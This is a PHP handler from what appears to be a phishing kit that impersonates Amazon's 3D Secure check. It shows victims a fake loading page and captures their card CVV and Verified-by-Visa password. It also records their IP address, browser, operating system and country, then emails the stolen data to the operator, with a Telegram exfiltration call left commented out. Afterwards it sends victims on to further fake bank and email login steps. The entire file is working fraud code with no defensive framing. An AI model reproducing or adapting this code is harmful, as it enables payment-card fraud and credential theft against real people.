<?php
 require_once(dirname(dirname(dirname(__DIR__))).'/autoloader.php');
echo '<title>Amazon - Loading ... </title>';
echo '<center><br><br><br><br><img src="../../aws/img/gif/loading-4x._V1_.gif" style="margin-top:20%"></center>';

if(isset($_POST))
{
    $check = ['cvv','password_vbv'];
if($core->empty_post_array($check))
{
     $core->redirect('../../ap/verified?openid.pape.max_auth_age='.sha1(time()).'&locale='.@$_GET['locale']);
      exit;
}
	$cvv = $core->post('cvv');
	$passwd = $core->post('password_vbv');

	$data = ['cvv' => $cvv , 'password' => $passwd ,   'useragent' => $_SERVER['HTTP_USER_AGENT'] ,
            'ip' => $core->userIP() , 
            'country' => $country_name , 
            'date' => date('D,d m Y H:i')];
    $info = $country_name." - ".$core->getOS()." - ".$core->userIP()." - ".$core->getBrowser();

	$sendMsg = $core->parse_result('3dsecure',$data);
	$sendSubj = "3D Secure : ".$core->session('bank')." ".$core->session('brandtype')." ".$core->session('levelcountry')." [ $info ]";
	$sendFrom = "Amazon";
    //$core->sendtele($telegram_result,$sendSubj."\n\n".$sendMsg);
    $core->sendmail($email_result,$sendFrom,$sendSubj,$sendMsg);
	$core->stats('3dsecure',$sendSubj);

	 if($core->parse_hijaiyh('sp','bank') == 1)
        {
            $kemana = 'bank';
        }else{
           
                if($core->parse_hijaiyh('sp','email_login') == 1)
                {
                    $kemana = 'email';
                }else{
                    $kemana = 'finish';
                }
            
        }
	$core->redirect('../../ap/'.$kemana.'?openid.pape.max_auth_age='.sha1(time()).'&locale='.@$_GET['locale']);
}
